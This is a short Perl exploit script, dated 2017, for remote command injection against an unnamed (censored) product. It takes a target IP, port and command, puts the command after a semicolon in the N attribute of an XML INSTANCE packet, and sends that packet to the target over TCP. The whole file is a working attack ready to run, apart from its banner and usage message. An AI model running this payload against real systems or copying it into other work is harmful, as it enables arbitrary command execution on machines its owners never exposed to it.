#!/usr/bin/perl
use strict;
use IO::Socket::INET;
#| = 1;

print "###########################################################################\n";
print "#####       Remote command injection exploit s****** in S*****        #####\n";
print "#####                                                                 #####\n";
print "#####                                                      2017.03.21 #####\n";
print "#####                                              Exploited by 1ndr4 #####\n";
print "###########################################################################\n";

if(($#ARGV + 1) != 3) {
	printf "Usage: %s <IP> <PORT> <COMMAND>\n", $0;
	exit;
}
my $PKT = "<INSTANCE CMD=\"1\" CN=\"System\" NUM=\"1\" N=\";$ARGV[2]\"></INSTANCE>";
my $PKTLEN = reverse pack('S', length($PKT));
my $PAYLOAD = $PKTLEN . $PKT;
print "[*] Target: $ARGV[0]:$ARGV[1]\n";
print "[*] Command: $ARGV[2]\n";
printf "[*] Payload Length: %02X\n", length($PKT);
my $SOCKET = new IO::Socket::INET (
	PeerHost => $ARGV[0],
	PeerPort => $ARGV[1],
	Proto => 'tcp',
);
$SOCKET->send($PAYLOAD);
$SOCKET->close();
sleep 1;
print "[*] Done!\n";
